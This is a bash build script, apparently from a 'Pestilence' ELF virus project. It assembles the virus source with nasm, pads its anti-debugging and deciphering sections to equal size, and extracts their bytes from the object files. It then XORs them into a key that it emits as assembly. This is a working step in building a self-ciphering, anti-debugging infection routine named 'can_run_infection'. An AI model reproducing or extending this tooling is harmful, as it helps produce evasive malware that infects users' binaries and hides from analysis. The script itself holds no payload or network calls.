#!/bin/bash
set -euo pipefail
WORK_FOLDER=$(mktemp -d /tmp/pestilence_convert_payloadXXXX)
trap cleanup EXIT

cleanup()
{
	rm -r "$WORK_FOLDER"
}

main()
{
	same_size_between_payloads
	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_anti_debugging2.o $WORK_FOLDER/TMP_main_without_anti_debugging.s
	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_uncipher2.o $WORK_FOLDER/TMP_main_without_uncipher.s
	start_address=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep "can_run_infection.TMP_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/0x\1/')
	stop_address=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep "can_run_infection.TMP_END_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/obase=16;ibase=16;\U\1+1/' | bc | sed 's/^/0x/')

	START=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | head -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)
	END=$(objdump -F -d --start-address=$start_address --stop-address=$stop_address $WORK_FOLDER/TMP_main_without_anti_debugging2.o | grep -E "^[0-9a-z].*can_run_infection.*File Offset" | tail -n1 | sed -E 's/.*File Offset: 0x([0-9a-z]*).*/ibase=16;\U\1/' | bc)

	cat $WORK_FOLDER/TMP_main_without_uncipher2.o | head -c+$END | tail -c+$START > anti_debugging.bin
	cat $WORK_FOLDER/TMP_main_without_anti_debugging2.o | head -c+$END | tail -c+$START > ciphering.bin
	python xor.py
	xxd -g1 magic_key.bin | perl -pe 's/^[0-9a-z]*: ((?:[0-9a-z]{2} )*) .*$/\1/' > magic_key.s
	perl -i -pe 's/([0-9a-z]{2})/0x\1,/g;s/, $//' magic_key.s
	sed -i 's/^/db /' magic_key.s
}

same_size_between_payloads()
{
	perl -0777 -pe 's/\.TMP_anti_debugging:.*\.TMP_END_anti_debugging://s' main.s > $WORK_FOLDER/TMP_main_without_anti_debugging.s
	perl -0777 -pe 's/\.TMP_uncipher:.*\.TMP_END_uncipher://s' main.s > $WORK_FOLDER/TMP_main_without_uncipher.s

	# TODO Change ../ with absolute path from this script or cd
	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_anti_debugging.o $WORK_FOLDER/TMP_main_without_anti_debugging.s
	nasm -I ../includes/ -felf64 -o $WORK_FOLDER/TMP_main_without_uncipher.o $WORK_FOLDER/TMP_main_without_uncipher.s
	start_offset=$(nm $WORK_FOLDER/TMP_main_without_uncipher.o | grep "can_run_infection.TMP_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	end_offset=$(nm $WORK_FOLDER/TMP_main_without_uncipher.o | grep "can_run_infection.TMP_END_anti_debugging" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	anti_debugging_size=$((end_offset-start_offset))
	start_offset=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging.o | grep "can_run_infection.TMP_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	end_offset=$(nm $WORK_FOLDER/TMP_main_without_anti_debugging.o | grep "can_run_infection.TMP_END_uncipher" | cut -d ' ' -f1 | sed -E 's/^0*([^0][0-9a-z]*)$/ibase=16;\U\1/' | bc)
	cipher_size=$((end_offset-start_offset))
	if [[ $cipher_size -lt $anti_debugging_size ]]; then
		diff_size=$((anti_debugging_size-cipher_size))
		sed -i -E "s/(\.TMP_END_uncipher:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" "$WORK_FOLDER/TMP_main_without_anti_debugging.s"
		sed -E "s/(\.TMP_END_uncipher:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" main.s > main.s.new
	fi

	if [[ $cipher_size -gt $anti_debugging_size ]]; then
		diff_size=$((cipher_size-anti_debugging_size))
		sed -i -E "s/(\.TMP_END_anti_debugging:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" "$WORK_FOLDER/TMP_main_without_uncipher.s"
		sed -E "s/(\.TMP_END_anti_debugging:)/$(printf 'nop\\n%.0s' $(seq 1 $diff_size))\1/" main.s > main.s.new
	fi
}

# 'shuf reads all input before opening OUTPUT-FILE, so you can safely shuffle a file in place
# Cf. $> info shuf
# Cf. https://stackoverflow.com/a/55655338/8371072	
write_to()
{
	file="$1"
	shuf --output="$file" --random-source=/dev/zero 
}

main "$@"
